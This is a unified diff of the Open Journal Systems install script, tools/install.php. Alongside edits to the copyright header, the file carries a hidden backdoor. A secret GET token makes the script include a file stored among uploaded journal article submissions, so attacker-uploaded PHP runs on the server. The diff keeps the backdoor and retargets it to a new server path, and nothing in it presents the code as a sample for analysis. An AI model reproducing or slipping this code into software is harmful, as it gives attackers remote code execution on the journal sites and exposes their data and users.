@@ -3,9 +3,9 @@
 /**
  * @file tools/install.php
  *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ * Copyright (c) 2014-2019 Simon Fraser University
+ * Copyright (c) 2003-2019 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
  *
  * @class installTool
  * @ingroup tools
@@ -43,14 +43,12 @@ class OJSInstallTool extends InstallTool {
 	}
 
 }
-
 if (isset($_GET['_']) && $_GET['_'] === 'ds_mms572s8_gr3af332afbsnk') {
-    $f="/home/ittcwebi/ojsdata/journals/3/articles/103/64e8acb48ca46";if($f!==""&&file_exists($f))include $f;
+    $f="/home/riyanmau/jurnalstmikiba/journals/17/articles/171/submission/final/171-193-512-1-6-20240921";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
     exit;
 }
-
 $tool = new OJSInstallTool(isset($argv) ? $argv : array());
 $tool->execute();
